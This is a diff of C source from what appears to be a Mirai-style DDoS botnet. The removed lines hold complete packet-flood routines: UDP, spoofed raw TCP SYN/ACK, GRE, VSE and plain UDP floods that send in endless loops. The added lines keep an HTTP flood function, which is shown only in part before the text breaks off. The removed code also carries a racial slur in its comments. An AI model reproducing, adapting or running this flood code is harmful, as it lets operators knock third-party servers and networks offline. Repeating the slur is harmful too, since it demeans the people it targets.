@@ -1,601 +1,29 @@
 #define _GNU_SOURCE
+
+#ifdef DEBUG
 #include <stdio.h>
+#endif
 #include <stdlib.h>
 #include <unistd.h>
 #include <sys/socket.h>
-#include <arpa/inet.h>
-#include <linux/ip.h>
-#include <linux/udp.h>
-#include <linux/if_ether.h>
-#include <linux/tcp.h>
+#include <sys/select.h>
 #include <errno.h>
+#include <string.h>
 #include <fcntl.h>
 
 #include "includes.h"
 #include "attack.h"
-#include "checksum.h"
 #include "rand.h"
-#include "util.h"
 #include "table.h"
-#include "protocol.h"
-static ipv4_t get_dns_resolver(void);
+#include "util.h"
 
-void attack_method_std(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+void attack_app_proxy(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
-    int i;
-    char **pkts = calloc(targs_len, sizeof (char *));
-    int *fds = calloc(targs_len, sizeof (int));
-    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
-    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
-    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1024);
-    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
-    struct sockaddr_in bind_addr = {0};
-    if (sport == 0xffff)
-    {
-        sport = rand_next();
-    } else {
-        sport = htons(sport);
-    }
-    for (i = 0; i < targs_len; i++)
-    {
-        struct iphdr *iph;
-        struct udphdr *udph;
-        char *data;
-        pkts[i] = calloc(65535, sizeof (char));
-        if (dport == 0xffff)
-            targs[i].sock_addr.sin_port = rand_next();
-        else
-            targs[i].sock_addr.sin_port = htons(dport);
-        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
-        {
-            return;
-        }
-        bind_addr.sin_family = AF_INET;
-        bind_addr.sin_port = sport;
-        bind_addr.sin_addr.s_addr = 0;
-        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
-        {
-            //Nigga
-        }
-        if (targs[i].netmask < 32)
-            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
-        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
-        {
-            //Nigga
-        }
-    }
-    while (TRUE)
-    {
-        for (i = 0; i < targs_len; i++)
-        {
-            char *data = pkts[i];
-            if (data_rand)
-                rand_str(data, data_len);
-            send(fds[i], data, data_len, MSG_NOSIGNAL);
-        }
-    }
+
 }
-void attack_method_tcpsyn(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
-{
-    int i, fd;
-    char **pkts = calloc(targs_len, sizeof (char *));
-    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
-    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
-    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
-    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
-    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
-    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
-    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
-    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0);
-    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
-    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, FALSE);
-    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
-    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
-    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, TRUE);
-    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
-    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
-    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
-    {
-        return;
-    }
-    i = 1;
-    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
-    {
-        close(fd);
-        return;
-    }
-    for (i = 0; i < targs_len; i++)
-    {
-        struct iphdr *iph;
-        struct tcphdr *tcph;
-        uint8_t *opts;
-        pkts[i] = calloc(128, sizeof (char));
-        iph = (struct iphdr *)pkts[i];
-        tcph = (struct tcphdr *)(iph + 1);
-        opts = (uint8_t *)(tcph + 1);
-        iph->version = 4;
-        iph->ihl = 5;
-        iph->tos = ip_tos;
-        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + 20);
-        iph->id = htons(ip_ident);
-        iph->ttl = ip_ttl;
-        if (dont_frag)
-            iph->frag_off = htons(1 << 14);
-        iph->protocol = IPPROTO_TCP;
-        iph->saddr = source_ip;
-        iph->daddr = targs[i].addr;
-        tcph->source = htons(sport);
-        tcph->dest = htons(dport);
-        tcph->seq = htons(seq);
-        tcph->doff = 10;
-        tcph->urg = urg_fl;
-        tcph->ack = ack_fl;
-        tcph->psh = psh_fl;
-        tcph->rst = rst_fl;
-        tcph->syn = syn_fl;
-        tcph->fin = fin_fl;
-        *opts++ = PROTO_TCP_OPT_MSS;
-        *opts++ = 4;
-        *((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
-        opts += sizeof (uint16_t);
-        *opts++ = PROTO_TCP_OPT_SACK;
-        *opts++ = 2;
-        *opts++ = PROTO_TCP_OPT_TSVAL;
-        *opts++ = 10;
-        *((uint32_t *)opts) = rand_next();
-        opts += sizeof (uint32_t);
-        *((uint32_t *)opts) = 0;
-        opts += sizeof (uint32_t);
-        *opts++ = 1;
-        *opts++ = PROTO_TCP_OPT_WSS;
-        *opts++ = 3;
-        *opts++ = 6;
-    }
-    while (TRUE)
-    {
-        for (i = 0; i < targs_len; i++)
-        {
-            char *pkt = pkts[i];
-            struct iphdr *iph = (struct iphdr *)pkt;
-            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
-            if (targs[i].netmask < 32)
-                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
-            if (source_ip == 0xffffffff)
-                iph->saddr = rand_next();
-            if (ip_ident == 0xffff)
-                iph->id = rand_next() & 0xffff;
-            if (sport == 0xffff)
-                tcph->source = rand_next() & 0xffff;
-            if (dport == 0xffff)
-                tcph->dest = rand_next() & 0xffff;
-            if (seq == 0xffff)
-                tcph->seq = rand_next();
-            if (ack == 0xffff)
-                tcph->ack_seq = rand_next();
-            if (urg_fl)
-                tcph->urg_ptr = rand_next() & 0xffff;
-            iph->check = 0;
-            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
-            tcph->check = 0;
-            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20);
-            targs[i].sock_addr.sin_port = tcph->dest;
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
-        }
-    }
-}
-void attack_method_greip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
-{
-    int i, fd;
-    char **pkts = calloc(targs_len, sizeof (char *));
-    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
-    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
-    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
-    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
-    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
-    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
-    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
-    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
-    BOOL gcip = attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, FALSE);
-    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
-    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
-    {
-        return;
-    }
-    i = 1;
-    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
-    {
-        close(fd);
-        return;
-    }
-    for (i = 0; i < targs_len; i++)
-    {
-        struct iphdr *iph;
-        struct grehdr *greh;
-        struct iphdr *greiph;
-        struct udphdr *udph;
-        pkts[i] = calloc(1510, sizeof (char *));
-        iph = (struct iphdr *)(pkts[i]);
-        greh = (struct grehdr *)(iph + 1);
-        greiph = (struct iphdr *)(greh + 1);
-        udph = (struct udphdr *)(greiph + 1);
-        iph->version = 4;
-        iph->ihl = 5;
-        iph->tos = ip_tos;
-        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
-        iph->id = htons(ip_ident);
-        iph->ttl = ip_ttl;
-        if (dont_frag)
-            iph->frag_off = htons(1 << 14);
-        iph->protocol = IPPROTO_GRE;
-        iph->saddr = source_ip;
-        iph->daddr = targs[i].addr;
-        greh->protocol = htons(ETH_P_IP);
-        greiph->version = 4;
-        greiph->ihl = 5;
-        greiph->tos = ip_tos;
-        greiph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
-        greiph->id = htons(~ip_ident);
-        greiph->ttl = ip_ttl;
-        if (dont_frag)
-            greiph->frag_off = htons(1 << 14);
-        greiph->protocol = IPPROTO_UDP;
-        greiph->saddr = rand_next();
-        if (gcip)
-            greiph->daddr = iph->daddr;
-        else
-            greiph->daddr = ~(greiph->saddr - 1024);
-        udph->source = htons(sport);
-        udph->dest = htons(dport);
-        udph->len = htons(sizeof (struct udphdr) + data_len);
-    }
-    while (TRUE)
-    {
-        for (i = 0; i < targs_len; i++)
-        {
-            char *pkt = pkts[i];
-            struct iphdr *iph = (struct iphdr *)pkt;
-            struct grehdr *greh = (struct grehdr *)(iph + 1);
-            struct iphdr *greiph = (struct iphdr *)(greh + 1);
-            struct udphdr *udph = (struct udphdr *)(greiph + 1);
-            char *data = (char *)(udph + 1);
-            if (targs[i].netmask < 32)
-                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
-            if (source_ip == 0xffffffff)
-                iph->saddr = rand_next();
-            if (ip_ident == 0xffff)
-            {
-                iph->id = rand_next() & 0xffff;
-                greiph->id = ~(iph->id - 1000);
-            }
-            if (sport == 0xffff)
-                udph->source = rand_next() & 0xffff;
-            if (dport == 0xffff)
-                udph->dest = rand_next() & 0xffff;
-            if (!gcip)
-                greiph->daddr = rand_next();
-            else
-                greiph->daddr = iph->daddr;
-            if (data_rand)
-                rand_str(data, data_len);
-            iph->check = 0;
-            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
-            greiph->check = 0;
-            greiph->check = checksum_generic((uint16_t *)greiph, sizeof (struct iphdr));
-            udph->check = 0;
-            udph->check = checksum_tcpudp(greiph, udph, udph->len, sizeof (struct udphdr) + data_len);
-            targs[i].sock_addr.sin_family = AF_INET;
-            targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
-            targs[i].sock_addr.sin_port = 0;
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
-        }
-    }
-}
-void attack_method_tcpack(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
-{
-    int i, fd;
-    char **pkts = calloc(targs_len, sizeof (char *));
-    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
-    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
-    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
-    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
-    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
-    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
-    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
-    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0xffff);
-    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
-    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
-    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
-    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
-    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);
-    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
-    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
-    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
-    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
-    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
-    {
-        return;
-    }
-    i = 1;
-    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
-    {
-        close(fd);
-        return;
-    }
-    for (i = 0; i < targs_len; i++)
-    {
-        struct iphdr *iph;
-        struct tcphdr *tcph;
-        char *payload;
-        pkts[i] = calloc(1510, sizeof (char));
-        iph = (struct iphdr *)pkts[i];
-        tcph = (struct tcphdr *)(iph + 1);
-        payload = (char *)(tcph + 1);
-        iph->version = 4;
-        iph->ihl = 5;
-        iph->tos = ip_tos;
-        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
-        iph->id = htons(ip_ident);
-        iph->ttl = ip_ttl;
-        if (dont_frag)
-            iph->frag_off = htons(1 << 14);
-        iph->protocol = IPPROTO_TCP;
-        iph->saddr = source_ip;
-        iph->daddr = targs[i].addr;
-        tcph->source = htons(sport);
-        tcph->dest = htons(dport);
-        tcph->seq = htons(seq);
-        tcph->doff = 5;
-        tcph->urg = urg_fl;
-        tcph->ack = ack_fl;
-        tcph->psh = psh_fl;
-        tcph->rst = rst_fl;
-        tcph->syn = syn_fl;
-        tcph->fin = fin_fl;
-        tcph->window = rand_next() & 0xffff;
-        if (psh_fl)
-            tcph->psh = TRUE;
-        rand_str(payload, data_len);
-    }
-    while (TRUE)
-    {
-        for (i = 0; i < targs_len; i++)
-        {
-            char *pkt = pkts[i];
-            struct iphdr *iph = (struct iphdr *)pkt;
-            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
-            char *data = (char *)(tcph + 1);
-            if (targs[i].netmask < 32)
-                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
-            if (source_ip == 0xffffffff)
-                iph->saddr = rand_next();
-            if (ip_ident == 0xffff)
-                iph->id = rand_next() & 0xffff;
-            if (sport == 0xffff)
-                tcph->source = rand_next() & 0xffff;
-            if (dport == 0xffff)
-                tcph->dest = rand_next() & 0xffff;
-            if (seq == 0xffff)
-                tcph->seq = rand_next();
-            if (ack == 0xffff)
-                tcph->ack_seq = rand_next();
-            if (data_rand)
-                rand_str(data, data_len);
-            iph->check = 0;
-            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
-            tcph->check = 0;
-            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);
-            targs[i].sock_addr.sin_port = tcph->dest;
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
-        }
-    }
-}
-void attack_method_udpgeneric(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
-{
-    int i, fd;
-    char **pkts = calloc(targs_len, sizeof (char *));
-    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
-    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
-    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
-    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
-    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
-    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
-    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
-    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
-    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
-    if (data_len > 1460)
-        data_len = 1460;
-    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
-    {
-        return;
-    }
-    i = 1;
-    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
-    {
-        close(fd);
-        return;
-    }
-    for (i = 0; i < targs_len; i++)
-    {
-        struct iphdr *iph;
-        struct udphdr *udph;
-        pkts[i] = calloc(1510, sizeof (char));
-        iph = (struct iphdr *)pkts[i];
-        udph = (struct udphdr *)(iph + 1);
-        iph->version = 4;
-        iph->ihl = 5;
-        iph->tos = ip_tos;
-        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
-        iph->id = htons(ip_ident);
-        iph->ttl = ip_ttl;
-        if (dont_frag)
-            iph->frag_off = htons(1 << 14);
-        iph->protocol = IPPROTO_UDP;
-        iph->saddr = source_ip;
-        iph->daddr = targs[i].addr;
-        udph->source = htons(sport);
-        udph->dest = htons(dport);
-        udph->len = htons(sizeof (struct udphdr) + data_len);
-    }
-    while (TRUE)
-    {
-        for (i = 0; i < targs_len; i++)
-        {
-            char *pkt = pkts[i];
-            struct iphdr *iph = (struct iphdr *)pkt;
-            struct udphdr *udph = (struct udphdr *)(iph + 1);
-            char *data = (char *)(udph + 1);
-            if (targs[i].netmask < 32)
-                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
-            if (source_ip == 0xffffffff)
-                iph->saddr = rand_next();
-            if (ip_ident == 0xffff)
-                iph->id = (uint16_t)rand_next();
-            if (sport == 0xffff)
-                udph->source = rand_next();
-            if (dport == 0xffff)
-                udph->dest = rand_next();
-            if (data_rand)
-                rand_str(data, data_len);
-            iph->check = 0;
-            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
-            udph->check = 0;
-            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + data_len);
-            targs[i].sock_addr.sin_port = udph->dest;
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
-        }
-    }
-}
-void attack_method_udpplain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
-{
-    int i;
-    char **pkts = calloc(targs_len, sizeof (char *));
-    int *fds = calloc(targs_len, sizeof (int));
-    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
-    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
-    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
-    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
-    struct sockaddr_in bind_addr = {0};
-    if (sport == 0xffff)
-    {
-        sport = rand_next();
-    } else {
-        sport = htons(sport);
-    }
-    for (i = 0; i < targs_len; i++)
-    {
-        struct iphdr *iph;
-        struct udphdr *udph;
-        char *data;
-        pkts[i] = calloc(65535, sizeof (char));
-        if (dport == 0xffff)
-            targs[i].sock_addr.sin_port = rand_next();
-        else
-            targs[i].sock_addr.sin_port = htons(dport);
-        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
-        {
-            return;
-        }
-        bind_addr.sin_family = AF_INET;
-        bind_addr.sin_port = sport;
-        bind_addr.sin_addr.s_addr = 0;
-        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
-        {
-			//Nigga
-        }
-        if (targs[i].netmask < 32)
-            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
-        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
-        {
-			//Nigga
-        }
-    }
-    while (TRUE)
-    {
-        for (i = 0; i < targs_len; i++)
-        {
-            char *data = pkts[i];
-            if (data_rand)
-                rand_str(data, data_len);
-            send(fds[i], data, data_len, MSG_NOSIGNAL);
-        }
-    }
-}
-void attack_method_udpvse(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
-{
-    int i, fd;
-    char **pkts = calloc(targs_len, sizeof (char *));
-    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
-    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
-    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
-    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
-    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
-    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 27015);
-    char *vse_payload;
-    int vse_payload_len;
-    table_unlock_val(TABLE_ATK_VSE);
-    vse_payload = table_retrieve_val(TABLE_ATK_VSE, &vse_payload_len);
-    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
-    {
-        return;
-    }
-    i = 1;
-    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
-    {
-        close(fd);
-        return;
-    }
-    for (i = 0; i < targs_len; i++)
-    {
-        struct iphdr *iph;
-        struct udphdr *udph;
-        char *data;
-        pkts[i] = calloc(128, sizeof (char));
-        iph = (struct iphdr *)pkts[i];
-        udph = (struct udphdr *)(iph + 1);
-        data = (char *)(udph + 1);
-        iph->version = 4;
-        iph->ihl = 5;
-        iph->tos = ip_tos;
-        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
-        iph->id = htons(ip_ident);
-        iph->ttl = ip_ttl;
-        if (dont_frag)
-            iph->frag_off = htons(1 << 14);
-        iph->protocol = IPPROTO_UDP;
-        iph->saddr = LOCAL_ADDR;
-        iph->daddr = targs[i].addr;
-        udph->source = htons(sport);
-        udph->dest = htons(dport);
-        udph->len = htons(sizeof (struct udphdr) + 4 + vse_payload_len);
-        *((uint32_t *)data) = 0xffffffff;
-        data += sizeof (uint32_t);
-        util_memcpy(data, vse_payload, vse_payload_len);
-    }
-    while (TRUE)
-    {
-        for (i = 0; i < targs_len; i++)
-        {
-            char *pkt = pkts[i];
-            struct iphdr *iph = (struct iphdr *)pkt;
-            struct udphdr *udph = (struct udphdr *)(iph + 1);
-            if (targs[i].netmask < 32)
-                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
-            if (ip_ident == 0xffff)
-                iph->id = (uint16_t)rand_next();
-            if (sport == 0xffff)
-                udph->source = rand_next();
-            if (dport == 0xffff)
-                udph->dest = rand_next();
-            iph->check = 0;
-            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
-            udph->check = 0;
-            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
-            targs[i].sock_addr.sin_port = udph->dest;
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
-        }
-    }
-}
-void attack_method_httpnull(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+
+
+void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
     int i, ii, rfd, ret = 0;
     struct attack_http_state *http_table = NULL;
@@ -603,7 +31,7 @@ void attack_method_httpnull(uint8_t targs_len, struct attack_target *targs, uint
     char *method = attack_get_opt_str(opts_len, opts, ATK_OPT_METHOD, "GET");
     char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
     char *path = attack_get_opt_str(opts_len, opts, ATK_OPT_PATH, "/");
-    int sockets = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 512);
+    int sockets = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 1);
     port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
 
     char generic_memes[10241] = {0};
@@ -663,108 +91,83 @@ void attack_method_httpnull(uint8_t targs_len, struct attack_target *targs, uint
         if (targs[i % targs_len].netmask < 32)
             http_table[i].dst_addr = htonl(ntohl(targs[i % targs_len].addr) + (((uint32_t)rand_next()) >> targs[i % targs_len].netmask));
 
-        switch(rand_next() % 20)
+        switch(rand_next() % 15)
         {
             case 0:
-                table_unlock_val(TABLE_HTTP_ONE);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_ONE, NULL));
-                table_lock_val(TABLE_HTTP_ONE);
+                table_unlock_val(TABLE_HTTP_1);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_1, NULL));
+                table_lock_val(TABLE_HTTP_1);
                 break;
             case 1:
-                table_unlock_val(TABLE_HTTP_TWO);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWO, NULL));
-                table_lock_val(TABLE_HTTP_TWO);
+                table_unlock_val(TABLE_HTTP_2);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_2, NULL));
+                table_lock_val(TABLE_HTTP_2);
                 break;
             case 2:
-                table_unlock_val(TABLE_HTTP_THREE);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_THREE, NULL));
-                table_lock_val(TABLE_HTTP_THREE);
+                table_unlock_val(TABLE_HTTP_3);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_3, NULL));
+                table_lock_val(TABLE_HTTP_3);
                 break;
             case 3:
-                table_unlock_val(TABLE_HTTP_FOUR);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FOUR, NULL));
-                table_lock_val(TABLE_HTTP_FOUR);
+                table_unlock_val(TABLE_HTTP_4);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_4, NULL));
+                table_lock_val(TABLE_HTTP_4);
                 break;
             case 4:
-                table_unlock_val(TABLE_HTTP_FIVE);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FIVE, NULL));
-                table_lock_val(TABLE_HTTP_FIVE);
+                table_unlock_val(TABLE_HTTP_5);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_5, NULL));
+                table_lock_val(TABLE_HTTP_5);
                 break;
             case 5:
-                table_unlock_val(TABLE_HTTP_SIX);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_SIX, NULL));
-                table_lock_val(TABLE_HTTP_SIX);
+                table_unlock_val(TABLE_HTTP_6);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_6, NULL));
+                table_lock_val(TABLE_HTTP_6);
                 break;
             case 6:
-                table_unlock_val(TABLE_HTTP_SEVEN);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_SEVEN, NULL));
-                table_lock_val(TABLE_HTTP_SEVEN);
+                table_unlock_val(TABLE_HTTP_7);
+                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_7, NULL));
+                table_lock_val(TABLE_HTTP_7);
                 break;
             case 7:
-                table_unlock_val(TABLE_HTTP_EIGHT);
-                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_EIGHT, NULL));
-                table_lock_val(TABLE_HTTP_EIGHT);
+                table_unlock_val(TABLE_HTTP_8);
